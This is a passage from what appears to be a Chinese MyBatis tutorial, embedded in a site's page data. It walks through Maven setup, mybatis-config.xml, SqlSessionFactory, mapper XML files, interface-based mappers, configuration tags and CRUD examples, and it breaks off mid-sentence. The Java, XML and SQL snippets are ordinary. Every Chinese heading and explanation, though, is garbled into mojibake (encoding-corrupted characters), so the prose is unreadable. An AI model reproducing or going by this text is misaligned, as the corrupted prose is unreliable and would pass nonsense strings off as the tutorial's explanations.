ç­¾",slug:"sqlæ ç­¾",normalizedTitle:"sqlæ ç­¾",charIndex:28919},{level:2,title:"ç¼å­",slug:"ç¼å­",normalizedTitle:"ç¼å­",charIndex:11976},{level:3,title:"ä¸çº§ç¼å­",slug:"ä¸çº§ç¼å­",normalizedTitle:"ä¸çº§ç¼å­",charIndex:29739},{level:3,title:"äºçº§ç¼å­",slug:"äºçº§ç¼å­",normalizedTitle:"äºçº§ç¼å­",charIndex:29744},{level:3,title:"ç¼å­ç¸å³è®¾ç½®",slug:"ç¼å­ç¸å³è®¾ç½®",normalizedTitle:"ç¼å­ç¸å³è®¾ç½®",charIndex:32879},{level:3,title:"ç¼å­å·¥ä½åç",slug:"ç¼å­å·¥ä½åç",normalizedTitle:"ç¼å­å·¥ä½åç",charIndex:33155},{level:3,title:"ç¬¬ä¸æ¹ç¼å­EHCACHE",slug:"ç¬¬ä¸æ¹ç¼å­ehcache",normalizedTitle:"ç¬¬ä¸æ¹ç¼å­ehcache",charIndex:33168},{level:2,title:"æ´åSpring",slug:"æ´åspring",normalizedTitle:"æ´åspring",charIndex:34783},{level:2,title:"éåå·¥ç¨",slug:"éåå·¥ç¨",normalizedTitle:"éåå·¥ç¨",charIndex:51019},{level:2,title:"MyBatisè¿è¡åç",slug:"mybatisè¿è¡åç",normalizedTitle:"mybatisè¿è¡åç",charIndex:54293},{level:3,title:"åå»ºSQLSessionFactory",slug:"åå»ºsqlsessionfactory",normalizedTitle:"åå»ºsqlsessionfactory",charIndex:54313},{level:3,title:"åå»ºSQLSession",slug:"åå»ºsqlsession",normalizedTitle:"åå»ºsqlsession",charIndex:54313},{level:3,title:"è·åMapperçä»£çç±»å¯¹è±¡",slug:"è·åmapperçä»£çç±»å¯¹è±¡",normalizedTitle:"è·åmapperçä»£çç±»å¯¹è±¡",charIndex:54358},{level:3,title:"æ§è¡æ¥è¯¢",slug:"æ§è¡æ¥è¯¢",normalizedTitle:"æ§è¡æ¥è¯¢",charIndex:54379},{level:3,title:"æµç¨æ»ç»",slug:"æµç¨æ»ç»",normalizedTitle:"æµç¨æ»ç»",charIndex:54390},{level:2,title:"æä»¶",slug:"æä»¶",normalizedTitle:"æä»¶",charIndex:8882},{level:3,title:"åç",slug:"åç",normalizedTitle:"åç",charIndex:33159},{level:3,title:"ç¼åæä»¶",slug:"ç¼åæä»¶",normalizedTitle:"ç¼åæä»¶",charIndex:54593},{level:2,title:"æ©å±",slug:"æ©å±",normalizedTitle:"æ©å±",charIndex:29832},{level:3,title:"åé¡µ",slug:"åé¡µ",normalizedTitle:"åé¡µ",charIndex:55643},{level:3,title:"æ¹éæä½",slug:"æ¹éæä½",normalizedTitle:"æ¹éæä½",charIndex:56396},{level:3,title:"èªå®ä¹ç±»åå¤çå¨ Type Handler",slug:"èªå®ä¹ç±»åå¤çå¨-type-handler",normalizedTitle:"èªå®ä¹ç±»åå¤çå¨ type handler",charIndex:56556}],headersStr:"MyBatisç®ä» MyBatisDemoé¡¹ç® èæ¹æ³ æ¥å£å¼ç¼ç¨æ¹å¼ MyBatiséç½®æä»¶ properties æ ç­¾ settings æ ç­¾ typeAliases å«åå¤çå¨ typeHandlers plugins environments databaseIdProvider mappers Mapperæ å°æä»¶ å¢å æ¹æ¥ ä¼ å¥åæ°å¤ç æ¥è¯¢ç»æè¿å å°è£è¿åç»æ èåæ¥è¯¢çç»æè¿å èåæ¥è¯¢çéåç»æè¿å å¤åstepæ¥è¯¢ å³äºå»¶è¿å è½½ é´å«å¨ å¨æSQLè¯­å¥ ifæ ç­¾ whereæ ç­¾ trimæ ç­¾ chooseæ ç­¾ setæ ç­¾ foreachæ ç­¾ ä¸¤ä¸ªåç½®åæ° bindæ ç­¾ sqlæ ç­¾ ç¼å­ ä¸çº§ç¼å­ äºçº§ç¼å­ ç¼å­ç¸å³è®¾ç½® ç¼å­å·¥ä½åç ç¬¬ä¸æ¹ç¼å­EHCACHE æ´åSpring éåå·¥ç¨ MyBatisè¿è¡åç åå»ºSQLSessionFactory åå»ºSQLSession è·åMapperçä»£çç±»å¯¹è±¡ æ§è¡æ¥è¯¢ æµç¨æ»ç» æä»¶ åç ç¼åæä»¶ æ©å± åé¡µ æ¹éæä½ èªå®ä¹ç±»åå¤çå¨ Type Handler",content:'# MyBatis\n\n\n# MyBatisç®ä»\n\nMyBatis æ¯ä¸æ¬¾ä¼ç§çæä¹å±æ¡æ¶ï¼å®æ¯æèªå®ä¹ SQLãå­å¨è¿ç¨ä»¥åé«çº§æ å°ãMyBatis åé¤äºå ä¹ææç JDBC ä»£ç ä»¥åè®¾ç½®åæ°åè·åç»æéçå·¥ä½ãMyBatis å¯ä»¥éè¿ç®åç XML ææ³¨è§£æ¥éç½®åæ å°åå§ç±»åãæ¥å£å Java POJOï¼Plain Old Java Objectsï¼æ®éèå¼ Java å¯¹è±¡ï¼ä¸ºæ°æ®åºä¸­çè®°å½ã\n\nä¹åçæ°æ®åºæä½æ¹å¼ï¼åçJDBC-> JDBCUtils -> JDBCTemplates -> MyBatis\n\n\n\n\n\n\n# MyBatisDemoé¡¹ç®\n\n\n# èæ¹æ³\n\n 0. åå»ºæµè¯æ°æ®åºï¼å¹¶åå»ºæµè¯è¡¨\n\ncreate table tbl_employee(\nid int(11) PRIMARY KEY AUTO_INCREMENT,\nlast_name VARCHAR(200),\ngender char(1),\nemail VARCHAR(200)\n\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 1. å»ºç«Mavené¡¹ç®ï¼å¼å¥Mybatisç¸å³ä¾èµ\n\nè¦ä½¿ç¨ MyBatisï¼ åªéå° mybatis-x.x.x.jar æä»¶ç½®äºç±»è·¯å¾ï¼classpathï¼ä¸­å³å¯ã\n\nå¦æä½¿ç¨ Maven æ¥æå»ºé¡¹ç®ï¼åéå°ä¸é¢çä¾èµä»£ç ç½®äº pom.xml æä»¶ä¸­ï¼\n\n<dependencies>  \n     <dependency>  \n <groupId>org.mybatis</groupId>  \n <artifactId>mybatis</artifactId>  \n <version>3.5.9</version>  \n </dependency>  \n  \n \x3c!-- https://mvnrepository.com/artifact/mysql/mysql-connector-java --\x3e  \n <dependency>  \n <groupId>mysql</groupId>  \n <artifactId>mysql-connector-java</artifactId>  \n <version>8.0.22</version>  \n </dependency>  \n  \n \x3c!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --\x3e  \n <dependency>  \n <groupId>org.apache.logging.log4j</groupId>  \n <artifactId>log4j-core</artifactId>  \n <version>2.17.1</version>  \n </dependency>  \n  \n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n 2. éç½®æ¥å¿æå°\n\n<settings>  \n <setting name="logImpl" value="STDOUT_LOGGING" />  \n</settings>\n\n\n1\n2\n3\n\n 3. åå»ºMybatis-config.xmléç½®æä»¶ï¼éç½®æ°æ®æº\n\n<?xml version="1.0" encoding="UTF-8" ?>  \n<!DOCTYPE configuration  \n PUBLIC "-//mybatis.org//DTD Config 3.0//EN"  \n "http://mybatis.org/dtd/mybatis-3-config.dtd">  \n<configuration>  \n <environments default="development">  \n <environment id="development">  \n <transactionManager type="JDBC"/>  \n <dataSource type="POOLED">  \n <property name="driver" value="com.mysql.jdbc.Driver"/>  \n <property name="url" value="jdbc:mysql://localhost:3306/testmybatis"/>  \n <property name="username" value="root"/>  \n <property name="password" value="123456"/>  \n </dataSource>  \n </environment>  \n </environments>  \n <mappers>  \n     \x3c!--æ å°æä»¶ä½äºclasspathä¸ --\x3e\n <mapper resource="EmployeeMapper.xml"></mapper>  \n </mappers>  \n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n 4. ä» XML ä¸­æå»º SqlSessionFactory\n\næ¯ä¸ªåºäº MyBatis çåºç¨é½æ¯ä»¥ä¸ä¸ª SqlSessionFactory çå®ä¾ä¸ºæ ¸å¿çãSqlSessionFactory çå®ä¾å¯ä»¥éè¿ SqlSessionFactoryBuilder è·å¾ãè SqlSessionFactoryBuilder åå¯ä»¥ä» XML éç½®æä»¶æä¸ä¸ªé¢åéç½®ç Configuration å®ä¾æ¥æå»ºåº SqlSessionFactory å®ä¾ã\n\nä» XML æä»¶ä¸­æå»º SqlSessionFactory çå®ä¾éå¸¸ç®åï¼å»ºè®®ä½¿ç¨ç±»è·¯å¾ä¸çèµæºæä»¶è¿è¡éç½®ã ä½ä¹å¯ä»¥ä½¿ç¨ä»»æçè¾å¥æµï¼InputStreamï¼å®ä¾ï¼æ¯å¦ç¨æä»¶è·¯å¾å­ç¬¦ä¸²æ file:// URL æé çè¾å¥æµãMyBatis åå«ä¸ä¸ªåå« Resources çå·¥å·ç±»ï¼å®åå«ä¸äºå®ç¨æ¹æ³ï¼ä½¿å¾ä»ç±»è·¯å¾æå¶å®ä½ç½®å è½½èµæºæä»¶æ´å å®¹æã\n\npublic static void main(String[] args) throws IOException {  \n String resource = "mybatis-config.xml";  \n InputStream resourceAsStream = Resources.getResourceAsStream(resource);  \n SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(resourceAsStream);  \n SqlSession sqlSession = sqlSessionFactory.openSession();  \n System.out.println(sqlSession);  \n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 5. åå»ºå®ä½ç±»\n\npackage com.pwddd.mybatis3.entity;  \n  \npublic class Employee {  \n private int id;  \n private String lastName;  \n private int gender;  \n private String email;  \n  \n public int getId() {  \n return id;  \n }  \n  \n public void setId(int id) {  \n this.id = id;  \n }  \n  \n public String getLastName() {  \n return lastName;  \n }  \n  \n public void setLastName(String lastName) {  \n this.lastName = lastName;  \n }  \n  \n public int getGender() {  \n return gender;  \n }  \n  \n public void setGender(int gender) {  \n this.gender = gender;  \n }  \n  \n public String getEmail() {  \n return email;  \n }  \n  \n public void setEmail(String email) {  \n this.email = email;  \n }  \n  \n @Override  \n public String toString() {  \n return "Employee{" +  \n "id=" + id +  \n ", lastName=\'" + lastName + \'\\\'\' +  \n ", gender=" + gender +  \n ", email=\'" + email + \'\\\'\' +  \n \'}\';  \n }  \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n 6. åå»ºæ å°SQLè¯­å¥\n\n<?xml version="1.0" encoding="UTF-8" ?>  \n<!DOCTYPE mapper  \n PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"  \n "http://mybatis.org/dtd/mybatis-3-mapper.dtd">  \n\x3c!--åç§°ç©ºé´åæ¥è¯¢ä¸­çåç§°ç©ºé´ä¸è´--\x3e\n<mapper namespace="com.pwddd.mybatis3.EmployeeMapper">  \n \x3c!--  \n namespace:åç§°ç©ºé´;æå®ä¸ºæ¥å£çå¨ç±»å  \n idï¼å¯ä¸æ è¯  \n resultTypeï¼è¿åå¼ç±»å  \n #{id}ï¼ä»ä¼ éè¿æ¥çåæ°ä¸­ååºidå¼  \n  \n public Employee getEmpById(Integer id); --\x3e <select id="getEmpById" resultType="com.pwddd.mybatis3.entity.Employee"> \n   \n select id,last_name,email,gender from tbl_employee where id = #{id}  \n </select>  \n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n 7. åå»ºæ¥è¯¢\n\npublic static void main(String[] args) {  \n String resource = "mybatis-config.xml";  \n InputStream resourceAsStream = null;  \n SqlSession sqlSession = null;  \n try {  \n resourceAsStream = Resources.getResourceAsStream(resource);  \n SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(resourceAsStream);  \n sqlSession = sqlSessionFactory.openSession();  \n  \n Employee employee = sqlSession.selectOne("com.pwddd.mybatis3.EmployeeMapper.getEmpById", 1);  \n System.out.println(employee);  \n } catch (IOException e) {  \n e.printStackTrace();  \n } finally {  \n sqlSession.close();  \n }  \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# æ¥å£å¼ç¼ç¨æ¹å¼\n\n 1. åå»ºæ¥å£\n\npackage com.pwddd.mybatis3.dao;  \n  \nimport com.pwddd.mybatis3.entity.Employee;  \n  \npublic interface EmployeeMapper {  \n Employee getEmpById(Integer id);  \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 2. namespaceéç½®æ¥å£å¨ç±»å\n\n<mapper namespace="com.pwddd.mybatis3.dao.EmployeeMapper">\n\n\n1\n\n 3. mapper.xmlä¸­æ¥è¯¢æ¹æ³ååæ¥å£ä¸­å®ä¹çæ¹æ³åä¸è´\n\n<select id="getEmpById" resultType="com.pwddd.mybatis3.entity.Employee">  \n select id,last_name as lastName,email,gender from tbl_employee where id = #{id}  \n</select>\n\n\n1\n2\n3\n\n 4. ç¼åæµè¯æ¹æ³\n\n@Test\npublic void testInterface() throws IOException {\n    String resource = "mybatis-config.xml";\n    InputStream resourceAsStream = Resources.getResourceAsStream(resource);\n    SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(resourceAsStream);\n    SqlSession sqlSession = sqlSessionFactory.openSession();\n    EmployeeMapper mapper = sqlSession.getMapper(EmployeeMapper.class);\n    Employee emp = mapper.getEmpById(1);\n    System.out.println(emp);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# MyBatiséç½®æä»¶\n\n\n# properties æ ç­¾\n\nå¨Mybatiséç½®æä»¶ä¸­çä¸äºå±æ§ï¼å¦æ°æ®åºé¾æ¥çç¸å³ä¿¡æ¯ï¼å¯ä»¥éç½®å¨å¤é¨çéç½®æä»¶ä¸­ï¼éè¿propertiesæ ç­¾å°å¤é¨çéç½®æä»¶å¼å¥ï¼ç¶åä½¿ç¨${}å°éç½®å¯¼å¥å°mybatiséç½®æä»¶ä¸­ãå·ä½çç¨æ³å¦ä¸é¢æç¤ºï¼\n\n<properties resource="jdbc.properties" />\n\n\n1\n\n\né¤æ­¤ä¹å¤ï¼è¿å¯ä»¥å¨properties æ ç­¾åè®¾ç½®ç¸å³å±æ§çå¼ï¼ä½æ¯è¿æ ·ä¸ä¼æ¿æ¢æå¤é¨éç½®æä»¶ä¸­è®¾ç½®çå¼ï¼åªæ¯å¢å å¼ï¼\n\n<properties resource="jdbc.properties">  \n <property name="username" value="root"/>  \n <property name="password" value="123456"/>  \n</properties>\n\n\n1\n2\n3\n4\n\n\né¤æ­¤ä¹å¤ï¼è¿å¯ä»¥å¨åå»ºSqlSessionFactoryæ¶å°éç½®æä»¶ä¼ å¥ï¼\n\n@Test\npublic void testResource() throws IOException {\n    String resource = "mybatis-config.xml";\n    InputStream resourceAsStream = Resources.getResourceAsStream(resource);\n    Properties properties = new Properties();\n    properties.load(new FileInputStream(new File("src/main/resources/jdbc.properties")));\n    SqlSessionFactory build = new SqlSessionFactoryBuilder().build(resourceAsStream, properties);\n    SqlSession sqlSession = build.openSession();\n    System.out.println(sqlSession);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nä»Mybatis 3.4.2çæ¬å¼å§ï¼å¯ä»¥ä¸ºå±æ§è®¾ç½®ä¸ä¸ªé»è®¤å¼ï¼å¦æè·åä¸å°å¼åä½¿ç¨é»è®¤å¼ï¼ä½æ¯é»è®¤å¼çå±æ§æ²¡æå¼å¯ï¼å¹¶ä¸é»è®¤çåéç¬¦æ¯ï¼ï¼å¯ä»¥ä½¿ç¨å¦ä¸çéç½®è¿è¡è®¾ç½®åä½¿ç¨ãä¿®æ¹é»è®¤çåéç¬¦çç®çæ¯å¦æå±æ§åä¸­å«æå¶ä»çåå·åå®¹æå²çªï¼å¦æä¸å«ï¼é£ä¹å¯ä»¥æ­£å¸¸ä½¿ç¨é»è®¤å¼ï¼\n\n<property name="org.apache.ibatis.parsing.PropertyParser.enable-default-value" value="true"/>  \n<property name="org.apache.ibatis.parsing.PropertyParser.default-value-separator" value="?:"/>\n\n<property name="username" value="${mysql.username?:root}"/>\n\n\n1\n2\n3\n4\n\n\n\n# settings æ ç­¾\n\nè¿æ¯ MyBatis ä¸­æä¸ºéè¦çè°æ´è®¾ç½®ï¼å®ä»¬ä¼æ¹å MyBatis çè¿è¡æ¶è¡ä¸ºãç¨æ¥å¯¹Mybatisè¿è¡ä¸äºè®¾ç½®çéç½®ã\n\nå¸¸ç¨çéç½®åå®¹ååè½å¦ä¸ï¼\n\n#TODO\n\n\n\nå¼å¯é©¼å³°å½åï¼\n\n<setting name="mapUnderscoreToCamelCase" value="true"/>\n\n\n1\n\n\næ°æ®åºå¯¹äºNULLå¼çå¹éå¤ç\n\n<setting name="jdbcTypeForNull" value="Null"/>\n\n\n1\n\n\nå¼å¯åæ­¥æ¥è¯¢æå è½½ï¼\n\n<setting name="lazyLoadingEnabled" value="true"/>\n\x3c!--        æç§éè¦è¿è¡å±æ§çå è½½--\x3e\n<setting name="aggressiveLazyLoading" value="false"/>\n\n\n1\n2\n3\n\n\n\n# typeAliases å«åå¤çå¨\n\nç¨äºç»ç±»åèµ·å«åï¼ä»ç¨äº XML éç½®ï¼æå¨éä½åä½çå¨éå®ç±»åä¹¦åãå¨éå¸¸æåµä¸ï¼æä»¬å¨Mapperä¸­éç½®çResultTypeéå¸¸ä¸ºç±»çå¨ç±»åï¼è¿ç§æ¹æ³è¿äºåä½ï¼å¯ä»¥ä½¿ç¨å«åçæ¹å¼ï¼ä»¥åéç½®å°±å¯ä»¥ç¨å«åä»£æ¿å¨ç±»åäºã\n\n<typeAliases>\n    <typeAlias type="com.pwddd.mybatis.bean.Employee" alias="emp" />\n</typeAliases>\n\n\n1\n2\n3\n\n\né¤æ­¤ä¹å¤ï¼è¿å¯ä»¥éç½®æ¹éåä¸é¢çå«åï¼å¦ä¸éç½®ä¸­çåä¸çææç±»é½ä¼æä¸ä¸ªé¦å­æ¯å°åçå«åï¼\n\n<typeAliases> \n\t<package name="domain.blog"/> \n</typeAliases>\n\n\n1\n2\n3\n\n\nè¿å¯ä»¥ä½¿ç¨æ³¨è§£çæ¹å¼ï¼ä¸ºç±»èµ·å«åï¼ä½æ¯åææ¯éç½®åçå«åï¼\n\n<typeAliases>  \n    <package name="com.pwddd.hello.entity"/>  \n    \x3c!--        <typeAlias type="com.pwddd.hello.entity.Employee" alias="employee" />--\x3e  \n</typeAliases>\n\n\n1\n2\n3\n4\n\n\n@Alias("emp")  \npublic class Employee {\n\n\n1\n2\n\n\n\n# typeHandlers\n\nMyBatis å¨è®¾ç½®é¢å¤çè¯­å¥ï¼PreparedStatementï¼ä¸­çåæ°æä»ç»æéä¸­ååºä¸ä¸ªå¼æ¶ï¼ é½ä¼ç¨ç±»åå¤çå¨å°è·åå°çå¼ä»¥åéçæ¹å¼è½¬æ¢æ Java ç±»åãä» 3.4.5 å¼å§ï¼MyBatis é»è®¤æ¯æ JSR-310ï¼æ¥æåæ¶é´ APIï¼ã\n\n\n# plugins\n\nMyBatis åè®¸ä½ å¨æ å°è¯­å¥æ§è¡è¿ç¨ä¸­çæä¸ç¹è¿è¡æ¦æªè°ç¨ãé»è®¤æåµä¸ï¼MyBatis åè®¸ä½¿ç¨æä»¶æ¥æ¦æªçæ¹æ³è°ç¨åæ¬ï¼\n\n * Executor (update, query, flushStatements, commit, rollback, getTransaction, close, isClosed)\n * ParameterHandler (getParameterObject, setParameters)\n * ResultSetHandler (handleResultSets, handleOutputParameters)\n * StatementHandler (prepare, parameterize, batch, update, query)\n\n\n# environments\n\nMybaitsä¸ºäºæ´å¥½çéåºå¤ç§æ°æ®åºçè¿æ¥éè¦ï¼å¹¶ä¸æ¹ä¾¿å¤ä¸ªæ°æ®åºä¹é´çåæ¢ä½¿ç¨ï¼ä½¿ç¨environmentså¯¹æ°æ®åºè¿è¡éç½®ãenvironmentsæ ç­¾æä¸ä¸ªdefaultå±æ§ç¨äºæå®å½åä½¿ç¨çç¯å¢ãå¨environmentsæ ç­¾ä¸åæENVIRONMENTæ ç­¾ï¼ç¨äºéç½®å¤ä¸ªæ°æ®åºç¯å¢ã\n\n<environments default="mysql">  \n <environment id="mysql">  \n <transactionManager type="JDBC" />  \n <dataSource type="POOLED">  \n <property name="driver" value="${mysql.driver}"/>  \n <property name="url" value="${mysql.url}"/>  \n <property name="username" value="${username?:root}"/>  \n <property name="password" value="${mysql.password}"/>  \n </dataSource>  \n </environment>  \n</environments>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n# transactionManager\n\nå¨ MyBatis ä¸­æä¸¤ç§ç±»åçäºå¡ç®¡çå¨ï¼ä¹å°±æ¯ type="[JDBC|MANAGED]"ï¼ï¼\n\n * JDBC â è¿ä¸ªéç½®ç´æ¥ä½¿ç¨äº JDBC çæäº¤ååæ»è®¾æ½ï¼å®ä¾èµä»æ°æ®æºè·å¾çè¿æ¥æ¥ç®¡çäºå¡ä½ç¨åã\n * MANAGED â è¿ä¸ªéç½®å ä¹æ²¡åä»ä¹ãå®ä»ä¸æäº¤æåæ»ä¸ä¸ªè¿æ¥ï¼èæ¯è®©å®¹å¨æ¥ç®¡çäºå¡çæ´ä¸ªçå½å¨æï¼æ¯å¦ JEE åºç¨æå¡å¨çä¸ä¸æï¼ã é»è®¤æåµä¸å®ä¼å³é­è¿æ¥ã\n\nä½æ¯å¦æä½¿ç¨çspring+Mybatisï¼åå¯ä»¥å°äºå¡å¤çäº¤ç»Springæ¥åã\n\n# dataSource\n\nMybatisæä¸å¤§åå»ºçæ°æ®æºï¼\n\n * UNPOOLEDï¼è¿ä¸ªæ°æ®æºçå®ç°ä¼æ¯æ¬¡è¯·æ±æ¶æå¼åå³é­è¿æ¥ã\n * POOLEDï¼è¿ç§æ°æ®æºçå®ç°å©ç¨âæ± âçæ¦å¿µå° JDBC è¿æ¥å¯¹è±¡ç»ç»èµ·æ¥ï¼é¿åäºåå»ºæ°çè¿æ¥å®ä¾æ¶æå¿éçåå§ååè®¤è¯æ¶é´ã è¿ç§å¤çæ¹å¼å¾æµè¡ï¼è½ä½¿å¹¶å Web åºç¨å¿«éååºè¯·æ±ã\n * JNDIï¼è¿ä¸ªæ°æ®æºå®ç°æ¯ä¸ºäºè½å¨å¦ EJB æåºç¨æå¡å¨è¿ç±»å®¹å¨ä¸­ä½¿ç¨ï¼å®¹å¨å¯ä»¥éä¸­æå¨å¤é¨éç½®æ°æ®æºï¼ç¶åæ¾ç½®ä¸ä¸ª JNDI ä¸ä¸æçæ°æ®æºå¼ç¨ã\n\né¤æ­¤ä¹å¤è¿å¯ä»¥èªå®ä¹æ°æ®æºï¼typeä¸ºèªå®ä¹æ°æ®æºçå¨ç±»åã\n\n\n# databaseIdProvider\n\nMyBatisä¸ºä¸åçæ°æ®åºè®¾ç½®äºä¸åçæ°æ®åºçæ è¯ãè¿ç§å¤ååçæ¯ææ¯åºäºæ å°è¯­å¥ä¸­ç databaseId å±æ§ã MyBatis ä¼å è½½å¸¦æå¹éå½åæ°æ®åº databaseId å±æ§åææä¸å¸¦ databaseId å±æ§çè¯­å¥ãè¿ç§å¤ååçæ¯ææ¯åºäºæ å°è¯­å¥ä¸­ç databaseId å±æ§ã MyBatis ä¼å è½½å¸¦æå¹éå½åæ°æ®åº databaseId å±æ§åææä¸å¸¦ databaseId å±æ§çè¯­å¥ãåªéè¦ä¸ºä¸åçsqlè¯­å¥éç½®æ°æ®åºæ ç­¾ï¼dataBaseIdï¼å³å¯ã\n\n<databaseIdProvider type="DB_VENDOR">  \n <property name="SQL Server" value="sqlserver"/>  \n <property name="DB2" value="db2"/>  \n <property name="Oracle" value="oracle" />  \n</databaseIdProvider>\n\n\n1\n2\n3\n4\n5\n\n\n\n# mappers\n\næä»¬éè¦åè¯Mabatiså»åªéå¯»æ¾æä»¬çmapperéç½®æä»¶ãä½ å¯ä»¥ä½¿ç¨ç¸å¯¹äºç±»è·¯å¾çèµæºå¼ç¨ï¼æå®å¨éå®èµæºå®ä½ç¬¦ï¼åæ¬ file:/// å½¢å¼ç URLï¼ï¼æç±»ååååç­ãä¾å¦ï¼\n\n\n\x3c!-- ä½¿ç¨ç¸å¯¹äºç±»è·¯å¾çèµæºå¼ç¨ --\x3e  \n<mappers>  \n <mapper resource="org/mybatis/builder/AuthorMapper.xml"/>  \n <mapper resource="org/mybatis/builder/BlogMapper.xml"/>  \n <mapper resource="org/mybatis/builder/PostMapper.xml"/>  \n</mappers>  \n\x3c!-- ä½¿ç¨å®å¨éå®èµæºå®ä½ç¬¦ï¼URLï¼ --\x3e  \n<mappers>  \n <mapper url="file:///var/mappers/AuthorMapper.xml"/>  \n <mapper url="file:///var/mappers/BlogMapper.xml"/>  \n <mapper url="file:///var/mappers/PostMapper.xml"/>  \n</mappers>  \n\x3c!-- ä½¿ç¨æ å°å¨æ¥å£å®ç°ç±»çå®å¨éå®ç±»å --\x3e  \n<mappers>  \n <mapper class="org.mybatis.builder.AuthorMapper"/>  \n <mapper class="org.mybatis.builder.BlogMapper"/>  \n <mapper class="org.mybatis.builder.PostMapper"/>  \n</mappers>  \n\x3c!-- å°ååçæ å°å¨æ¥å£å®ç°å¨é¨æ³¨åä¸ºæ å°å¨ --\x3e  \n<mappers>  \n <package name="org.mybatis.builder"/>  \n</mappers>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nå¶ä¸­ï¼ä½¿ç¨æ å°å¨æ¥å£å®ç°ç±»çå®å¨éå®ç±»åè¿è¡æ³¨åæ¶ï¼å¯ä»¥ä½¿ç¨æ³¨è§£çæ¹å¼è¿è¡éç½®ã\n\n\t@Select("select * from tbl_employee where id=#{id}")\n\tpublic Employee getEmpById(Integer id);\n\n\n1\n2\n\n\nè¿ç§æ¹å¼è½ç¶ä¾¿æ·ï¼ä½æ¯å¯¹äºå¤æçSQLè¯­å¥ä¸æ¯å¾åå¥½ï¼å æ­¤å¤æçè¯­å¥å»ºè®®è¿æ¯å¨Mapperéç½®æä»¶ä¸­ç¼åã\n\n\n# Mapperæ å°æä»¶\n\nSQL æ å°æä»¶åªæå¾å°çå ä¸ªé¡¶çº§åç´ ï¼æç§åºè¢«å®ä¹çé¡ºåºååºï¼ï¼\n\n * cache â è¯¥å½åç©ºé´çç¼å­éç½®ã\n * cache-ref â å¼ç¨å¶å®å½åç©ºé´çç¼å­éç½®ã\n * resultMap â æè¿°å¦ä½ä»æ°æ®åºç»æéä¸­å è½½å¯¹è±¡ï¼æ¯æå¤æä¹æ¯æå¼ºå¤§çåç´ ã\n * parameterMap â èå¼é£æ ¼çåæ°æ å°ãæ­¤åç´ å·²è¢«åºå¼ï¼å¹¶å¯è½å¨å°æ¥è¢«ç§»é¤ï¼è¯·ä½¿ç¨è¡ååæ°æ å°ãææ¡£ä¸­ä¸ä¼ä»ç»æ­¤åç´ ã\n * sql â å¯è¢«å¶å®è¯­å¥å¼ç¨çå¯éç¨è¯­å¥åã\n * insert â æ å°æå¥è¯­å¥ã\n * update â æ å°æ´æ°è¯­å¥ã\n * delete â æ å°å é¤è¯­å¥ã\n * select â æ å°æ¥è¯¢è¯­å¥ã\n\n\n# å¢å æ¹æ¥\n\nMapperæ å°æä»¶ï¼\n\n<select id="getEmpById" resultType="employee">\n        select * from tbl_employee where id = #{id}\n    </select>\n\n    <insert id="addEmp" >\n        insert into tbl_employee(last_name,gender,email) values (#{lastName},#{gender},#{email})\n    </insert>\n\n    <update id="updateEmp" >\n        update tbl_employee\n            set last_name = #{lastName},\n             gender = #{gender},\n             email = #{email}\n        where id = #{id};\n    </update>\n\n    <delete id="deleteEmp" >\n        delete\n        from tbl_employee\n        where id=#{id};\n    </delete>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nå¯¹åºæ¥å£ï¼\n\nEmployee getEmpById(Integer id);\nInteger addEmp(Employee employee);\nInteger updateEmp(Employee employee);\nInteger deleteEmp(Integer id);\n\n\n1\n2\n3\n4\n\n\næµè¯ï¼\n\n@Test\npublic void testCRUD() throws IOException {\n    String resource = "mybatis-config.xml";\n    InputStream resourceAsStream = Resources.getResourceAsStream(resource);\n    SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(resourceAsStream);\n    SqlSession sqlSession = sqlSessionFactory.openSession();\n    EmployeeMapper employeeMapper = sqlSession.getMapper(EmployeeMapper.class);\n    System.out.println(employeeMapper.deleteEmp(2));\n    System.out.println(employeeMapper.addEmp(new Employee(4, "zhangsan", 1, "123@qq.com")));\n    System.out.println(employeeMapper.updateEmp(new Employee(1, "wangwu", 1, "wangwu@qq.com")));\n    sqlSession.commit();  // ç±äºmybatisé»è®¤å³é­äºèªå¨æäº¤åè½ å æ­¤éè¦æå¨æäº¤æ§è¡æä¼å½±åæ°æ®åº\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# ä¼ å¥åæ°å¤ç\n\n 1. ä¼ éåä¸ªåæ°ï¼#{ä»»æ} mybatisä¸åå¤ç\n 2. å¤ä¸ªåæ°ï¼\n    * SQLä¸­ä½¿ç¨#{åæ°å}åæ¥å£åä¸­ä¼ éçåæ°ååï¼è¿ç§æ¹å¼ä¼åºéï¼å¤ä¸ªåæ°ä¼è¢«å°è£æmapï¼#{}ä»mapä¸­åå¼ï¼å¯ä»¥ä½¿ç¨param1,param2æè